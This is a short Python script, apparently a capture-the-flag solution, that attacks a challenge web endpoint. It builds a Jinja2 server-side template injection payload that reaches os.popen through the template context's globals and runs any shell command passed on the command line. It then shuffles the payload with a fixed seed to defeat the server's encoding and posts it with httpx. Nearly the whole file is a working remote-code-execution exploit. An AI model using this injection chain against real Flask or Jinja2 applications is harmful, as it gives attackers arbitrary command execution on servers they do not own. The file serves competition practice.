import random
import sys
import httpx


def encode(payload) -> str:
    shuffled_indexes = []

    for i in range(len(payload)):
        shuffled_indexes.append(i)

    random.seed(0)
    random.shuffle(shuffled_indexes)

    encoded = []

    for _ in range(len(payload)):
        encoded.append("")

    for i in range(len(payload)):
        encoded[shuffled_indexes[i]] = payload[i]

    return "".join(encoded)


template = (
    "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('"
    + sys.argv[1]
    + "').read() }}"
)
payload = encode(template)
resp = httpx.post("https://winds.web.actf.co/shout", data={"text": payload})
print(resp.text)
